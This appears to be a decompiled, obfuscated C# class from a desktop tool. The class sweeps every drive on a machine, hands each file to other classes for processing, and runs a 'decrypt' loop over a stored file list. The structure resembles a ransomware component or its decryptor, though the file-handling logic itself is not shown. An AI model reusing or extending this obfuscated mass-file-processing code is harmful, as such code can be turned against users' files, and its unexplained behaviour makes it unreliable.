using System;
using System.Collections.Generic;
using System.IO;
using ns1;

namespace ns0;

internal class Class11
{
	private readonly Class3 class3_0;

	public Class11()
	{
		class3_0 = new Class3();
		class3_0.method_1();
	}

	public void method_0()
	{
		Class16 @class = new Class16();
		List<string> object_ = class3_0.method_0(Class3.string_0);
		if (Delegate22.smethod_0(Delegate240.smethod_0(object_, Class9.smethod_0(668)), Class10.smethod_0(22)))
		{
			return;
		}
		List<string>.Enumerator enumerator_ = Delegate87.smethod_0(object_);
		try
		{
			while (Delegate203.smethod_0(ref enumerator_))
			{
				string text = (MainWindow.current_decrypt_file = Delegate195.smethod_0(ref enumerator_));
				@class.method_0(text);
				@class.method_3();
				while (true)
				{
					if (!@class.method_5())
					{
						if (!Class6.smethod_0(text))
						{
							@class.method_4();
							break;
						}
						continue;
					}
					@class.method_1();
					@class.method_2();
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
	}

	public void method_1()
	{
		Class12 @class = new Class12();
		DriveInfo[] array = Delegate77.smethod_0();
		for (int i = Class9.smethod_0(672); i < array.Length; i += Class9.smethod_0(676))
		{
			List<string>.Enumerator enumerator_ = Delegate87.smethod_0(Class12.smethod_0(Delegate204.smethod_0(array[i])));
			try
			{
				while (Delegate203.smethod_0(ref enumerator_))
				{
					string string_ = Delegate195.smethod_0(ref enumerator_);
					@class.method_0(string_);
					@class.method_1();
				}
			}
			finally
			{
				((IDisposable)enumerator_).Dispose();
			}
		}
	}

	public void method_2(string string_0)
	{
		Class12 @class = new Class12();
		List<string>.Enumerator enumerator_ = Delegate87.smethod_0(Class12.smethod_0(string_0));
		try
		{
			while (Delegate203.smethod_0(ref enumerator_))
			{
				string string_ = Delegate195.smethod_0(ref enumerator_);
				@class.method_0(string_);
				@class.method_1();
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
	}

	public List<string> method_3()
	{
		try
		{
			return Delegate25.smethod_0(class3_0.method_0(Class3.string_0));
		}
		catch (Exception)
		{
			return Delegate113.smethod_0();
		}
	}
}
